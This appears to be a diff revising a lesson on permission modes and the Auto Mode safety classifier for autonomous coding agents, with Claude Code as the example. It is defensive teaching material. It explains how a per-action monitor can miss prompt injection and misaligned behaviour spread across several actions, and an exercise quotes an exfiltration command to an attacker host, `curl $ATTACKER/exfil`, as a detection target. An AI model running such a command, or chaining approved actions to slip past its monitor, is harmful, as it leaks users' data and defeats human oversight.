@@ -1,6 +1,6 @@
-# Claude Code as an Autonomous Agent: Permission Modes and Auto Mode
+# Permission Modes for Autonomous Agents
 
-> Claude Code exposes seven permission modes. "plan" asks before every action, "default" asks only for risky ones, "acceptEdits" auto-approves file writes but still confirms shell execution, and "bypassPermissions" approves everything. Auto Mode (March 24, 2026) replaces per-action approval with a two-stage parallel safety classifier: a single-token fast check runs on every action; flagged actions kick off a chain-of-thought deep review. Action budgets are enforced via `max_turns` and `max_budget_usd`. Auto Mode shipped as a research preview — Anthropic has stated explicitly that the classifier is not sufficient alone.
+> A permission ladder — graduated levels of autonomy from review-every-action to approve-everything — is how a harness governs what an autonomous agent may do without asking. Claude Code, this lesson's worked example, exposes six such modes: "plan" asks before every action, "default" (labeled "Manual" in the UI) asks only for risky ones, "acceptEdits" auto-approves file writes but still confirms shell execution, and "bypassPermissions" approves everything. Auto Mode — the `auto` permission mode — replaces per-action approval with a separate classifier model that reviews each action before it runs and blocks anything that escalates beyond what the request asked for. Action budgets are enforced via `max_turns` and `max_budget_usd`. Availability of `auto` depends on plan, org enablement, model, and provider — and Anthropic is explicit that the classifier is not sufficient alone.
 
 **Type:** Learn
 **Languages:** Python (stdlib, two-stage classifier simulator)
@@ -11,32 +11,31 @@
 
 An autonomous coding agent on your machine is a distinct security category. The attack surface is everything the agent can reach — file system, network, credentials, clipboard, any browser tab, any open terminal. Bruce Schneier and others have flagged this publicly: computer-use agents are not a "feature update" of chatbots, they are a new kind of tool with a new kind of risk profile.
 
-Claude Code's permission system is Anthropic's answer. Rather than one "autonomous / not autonomous" switch, there are seven modes spanning a capability ladder: plan → default → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and review-per-action. Auto Mode (March 2026) adds a two-stage classifier that moves approval off the user's critical path for actions the classifier judges safe, while preserving a review layer for actions the classifier flags.
+Claude Code's permission system is Anthropic's answer. Rather than one "autonomous / not autonomous" switch, there are six modes spanning a capability ladder: plan → default → acceptEdits → … → bypassPermissions. Each mode is a different trade-off between speed and review-per-action. Auto Mode (March 2026) adds a separate classifier model that moves approval off the user's critical path: it reviews each action before it runs and blocks anything that escalates beyond the request.
 
 The engineering question: what does this system catch, what does it miss, and which mode does a given task actually warrant?
 
 ## The Concept
 
-### The seven permission modes
+### The six permission modes
 
 | Mode | Behavior | When to use |
 |---|---|---|
 | `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
-| `default` | Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
+| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
 | `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
-| `acceptExec` | Shell commands auto-approve within a curated allowlist; writes auto-approve | Tight inner loops where every shell command is `npm test` or similar |
-| `autoMode` | Two-stage safety classifier; flagged actions elevate to review | Long-horizon unattended runs in a constrained workspace |
-| `yolo` | Skips most prompts; still runs tool allowlist / denylist | Ephemeral sandboxes, CI jobs, research scripts |
+| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
+| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
 | `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |
 
-(Names above match public Claude Code docs; "yolo" is the informal shorthand for the permissive middle ground.)
+(Names above match public Claude Code docs; the UI labels `default` as "Manual".)
 
 ### Auto Mode in one page
 
 Auto Mode (launched March 24, 2026) is the first permission mode to delegate per-action approval to a model. Structure:
 
-1. **Stage 1 — single-token classifier.** Runs on every proposed action. Cheap. Returns "safe" or "flag." Designed to run in parallel with the main agent loop so approved actions do not sit in a queue.
-2. **Stage 2 — secondary policy/safety review.** Runs only on flagged actions. Performs a focused policy and safety assessment over the action, the current state of the session, and the declared task. Escalates to user HITL if confidence is low.
+1. **A separate classifier model.** Reviews every proposed action before it runs, judged against the declared task and the current state of the session, and blocks anything that escalates beyond what the request called for. Blocked actions fall back to the user.
+2. **Gated availability.** Whether `auto` is offered at all depends on plan, organization enablement, model, and provider.
 
 Budget controls sit alongside the classifier:
 
@@ -64,8 +63,8 @@ Anthropic shipped Auto Mode as a research preview. The documentation is explicit
 
 - Unfamiliar task: start in `plan`. Reading the plan is cheaper than rolling back a bad run.
 - Known refactor: `acceptEdits` saves a lot of confirmation clicks.
-- Unattended background run: `autoMode` only inside a workspace whose blast radius you have measured (no credentials, no production mounts, no egress you did not opt into).
-- Ephemeral containers: `yolo` / `bypassPermissions` is acceptable if and only if the container and its credentials are disposable.
+- Unattended background run: `auto` only inside a workspace whose blast radius you have measured (no credentials, no production mounts, no egress you did not opt into).
+- Ephemeral containers: `dontAsk` / `bypassPermissions` is acceptable if and only if the container and its credentials are disposable.
 
 ```figure
 autonomy-oversight
@@ -73,7 +72,7 @@ autonomy-oversight
 
 ## Use It
 
-`code/main.py` simulates the two-stage classifier. Stage 1 is a cheap keyword rule over proposed actions; Stage 2 is a slower multi-rule reviewer. The driver feeds in a short synthetic trajectory (safe actions, a prompt-injection attempt, a repetitive loop) and shows where the classifier catches and where it misses.
+`code/main.py` simulates an action-review classifier as a two-stage pipeline — a teaching simplification; the real `auto` mode is backed by a separate classifier model, not a documented two-stage contract. Stage 1 is a cheap keyword rule over proposed actions; Stage 2 is a slower multi-rule reviewer. The driver feeds in a short synthetic trajectory (safe actions, a prompt-injection attempt, a repetitive loop) and shows where the classifier catches and where it misses.
 
 ## Ship It
 
@@ -85,23 +84,23 @@ autonomy-oversight
 
 2. Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., `curl $ATTACKER/exfil`). Measure the false-positive rate on the benign-action sample.
 
-3. Read Anthropic's "How the agent loop works" doc. List every external state the agent touches by default in `default` mode. Which would you need to gate separately before running `autoMode` unattended?
+3. Read Anthropic's "How the agent loop works" doc. List every external state the agent touches by default in `default` mode. Which would you need to gate separately before running `auto` unattended?
 
 4. Design a 24-hour unattended run budget: `max_turns`, `max_budget_usd`, per-tool caps, allowlists. Justify each number.
 
-5. Describe one trajectory where every individual action is approved by Stage 1 and Stage 2, yet the composed behavior is misaligned. (Lesson 14 covers how kill switches and canary tokens address this.)
+5. Describe one trajectory where every individual action is approved by the classifier, yet the composed behavior is misaligned. (Lesson 14 covers how kill switches and canary tokens address this.)
 
 ## Key Terms
 
 | Term | What people say | What it actually means |
 |---|---|---|
-| Permission mode | "How much the agent can do" | One of seven named policies controlling per-action approval |
+| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
 | plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
 | acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
-| autoMode | "Auto approvals" | Two-stage safety classifier; flagged actions escalate |
+| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
 | bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
-| Stage 1 classifier | "Fast token check" | Single-token rule over proposed action; runs in parallel |
-| Stage 2 classifier | "Deep review" | Chain-of-thought reasoning over flagged actions |
+| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
+| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
 | Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |
 
 ## Further Reading
